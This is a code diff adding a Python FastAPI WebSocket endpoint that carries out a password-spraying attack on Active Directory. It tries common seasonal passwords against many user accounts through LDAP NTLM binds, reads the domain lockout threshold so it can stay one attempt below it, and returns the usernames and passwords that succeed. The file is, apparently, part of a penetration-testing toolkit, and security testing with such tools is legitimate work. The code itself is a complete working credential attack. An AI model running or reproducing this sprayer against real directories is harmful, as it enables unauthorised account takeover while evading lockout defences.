@@ -1,0 +1,205 @@
+"""AD Password Sprayer — domain-aware, lockout-respecting.
+
+Tries a small list of passwords against a large list of users via LDAP bind
+(NTLM authentication). Before spraying, we read the domain's lockoutThreshold
+and back off automatically when a user is at threshold-1 attempts.
+
+We use LDAP bind specifically because it's the lightest-touch auth path —
+no Kerberos pre-auth, no SMB session, just the bind. It still counts toward
+the lockout counter.
+
+WS  /ws/ad-spray
+    client -> server:
+        {"creds": {dc_host, domain, ...},  # `username`/`password` ignored
+         "users": ["alice","bob",...],
+         "passwords": ["Spring2026!","Winter2026!"],
+         "delay_sec": 0.5,                  # between attempts
+         "max_lockouts": 0}                 # stop after N lockouts (0 = unlimited)
+
+    server -> client:
+        {"type":"started","total","lockout_threshold","safe_threshold"}
+        {"type":"attempt","user","password_index","status":"success"|"fail"|"locked"|"error","detail"}
+        {"type":"progress","done","total","success","locked"}
+        {"type":"done","elapsed","successes":[...],"locked_count","stopped"}
+        {"type":"error","detail"}
+"""
+from __future__ import annotations
+
+import asyncio
+import time
+from typing import Any
+
+from fastapi import APIRouter, WebSocket, WebSocketDisconnect
+
+from lib.ad_auth import CredsModel, domain_to_base_dn, open_ldap
+
+router = APIRouter(tags=["ad-spray"])
+
+
+def _get_lockout_threshold(creds: CredsModel) -> int:
+    """Best-effort: pull lockoutThreshold from the domain policy. Returns 0
+    (no lockout) if we can't read it or it's not set."""
+    try:
+        conn = open_ldap(creds)
+    except Exception:
+        return 0
+    try:
+        base = domain_to_base_dn(creds.domain)
+        conn.search(
+            search_base=base,
+            search_filter="(objectClass=domainDNS)",
+            attributes=["lockoutThreshold"],
+        )
+        if conn.entries:
+            return int(conn.entries[0].lockoutThreshold.value or 0)
+    except Exception:
+        pass
+    finally:
+        try: conn.unbind()
+        except Exception: pass
+    return 0
+
+
+def _try_bind(creds: CredsModel, user: str, password: str) -> tuple[str, str]:
+    """Return (status, detail). status ∈ success / fail / locked / error."""
+    from ldap3 import Server, Connection, NTLM
+    dom = creds.domain.split(".")[0] if creds.domain else ""
+    user_ntlm = f"{dom}\\{user}" if dom else user
+    server = Server(creds.dc_host, use_ssl=creds.use_ssl)
+    try:
+        conn = Connection(server, user=user_ntlm, password=password,
+                          authentication=NTLM, auto_bind=False)
+        ok = conn.bind()
+        if ok:
+            try: conn.unbind()
+            except Exception: pass
+            return "success", ""
+        # Inspect bind result for lockout hint
+        desc = (conn.result or {}).get("description", "")
+        msg = (conn.result or {}).get("message", "")
+        # AD returns specific sub-statuses; 0xC0000234 is account locked out
+        if "0000234" in msg or "locked" in msg.lower() or "locked" in desc.lower():
+            return "locked", msg or desc
+        return "fail", msg or desc
+    except Exception as e:
+        return "error", str(e)
+
+
+@router.websocket("/ws/ad-spray")
+async def spray_ws(ws: WebSocket) -> None:
+    await ws.accept()
+    stop = asyncio.Event()
+
+    async def listen_for_stop() -> None:
+        try:
+            while True:
+                msg = await ws.receive_json()
+                if isinstance(msg, dict) and msg.get("action") == "stop":
+                    stop.set(); return
+        except Exception:
+            stop.set()
+
+    try:
+        init = await ws.receive_json()
+        creds = CredsModel(**init.get("creds", {}))
+        users = list(init.get("users") or [])
+        passwords = list(init.get("passwords") or [])
+        delay = float(init.get("delay_sec", 0.5))
+        max_lockouts = int(init.get("max_lockouts", 0))
+
+        if not users or not passwords:
+            await ws.send_json({"type": "error",
+                "detail": "users[] and passwords[] both required"})
+            await ws.close(); return
+
+        # We need an authenticated bind to read the policy — caller must
+        # supply working creds in `creds.username` + `creds.password` OR
+        # accept that we treat threshold=0 (no lockout).
+        threshold = _get_lockout_threshold(creds)
+        safe = max(0, threshold - 1) if threshold > 0 else 0  # never hit the last attempt
+
+        total = len(users) * len(passwords)
+        await ws.send_json({
+            "type": "started", "total": total,
+            "lockout_threshold": threshold,
+            "safe_threshold": safe,
+        })
+
+        listener = asyncio.create_task(listen_for_stop())
+        t0 = time.monotonic()
+        per_user_failures: dict[str, int] = {}
+        per_user_locked: set[str] = set()
+        successes: list[dict[str, str]] = []
+        locked_count = 0
+        done = 0
+
+        loop = asyncio.get_event_loop()
+
+        for pi, password in enumerate(passwords):
+            if stop.is_set():
+                break
+            for user in users:
+                if stop.is_set():
+                    break
+                if user in per_user_locked:
+                    continue
+                # If we're at threshold-1 attempts for this user, skip to avoid lockout
+                if threshold > 0 and per_user_failures.get(user, 0) >= safe:
+                    await ws.send_json({"type": "attempt", "user": user,
+                                        "password_index": pi,
+                                        "status": "skipped",
+                                        "detail": "would-trigger-lockout"})
+                    done += 1
+                    continue
+                status, detail = await loop.run_in_executor(
+                    None, _try_bind, creds, user, password,
+                )
+                done += 1
+                if status == "success":
+                    successes.append({"user": user, "password": password})
+                    await ws.send_json({"type": "attempt", "user": user,
+                                        "password_index": pi,
+                                        "status": "success",
+                                        "detail": ""})
+                elif status == "locked":
+                    per_user_locked.add(user)
+                    locked_count += 1
+                    await ws.send_json({"type": "attempt", "user": user,
+                                        "password_index": pi,
+                                        "status": "locked",
+                                        "detail": detail[:200]})
+                    if max_lockouts and locked_count >= max_lockouts:
+                        stop.set()
+                else:  # fail or error
+                    per_user_failures[user] = per_user_failures.get(user, 0) + 1
+                    await ws.send_json({"type": "attempt", "user": user,
+                                        "password_index": pi,
+                                        "status": status,
+                                        "detail": detail[:200]})
+
+                if done % 5 == 0 or done == total:
+                    await ws.send_json({"type": "progress",
+                                        "done": done, "total": total,
+                                        "success": len(successes),
+                                        "locked": locked_count})
+                await asyncio.sleep(delay)
+
+        listener.cancel()
+        await ws.send_json({
+            "type": "done",
+            "elapsed": round(time.monotonic() - t0, 2),
+            "successes": successes,
+            "locked_count": locked_count,
+            "stopped": stop.is_set(),
+        })
+    except WebSocketDisconnect:
+        stop.set()
+    except Exception as exc:
+        try:
+            await ws.send_json({"type": "error",
+                                "detail": f"{type(exc).__name__}: {exc}"})
+        except Exception:
+            pass
+    finally:
+        try: await ws.close()
+        except Exception: pass
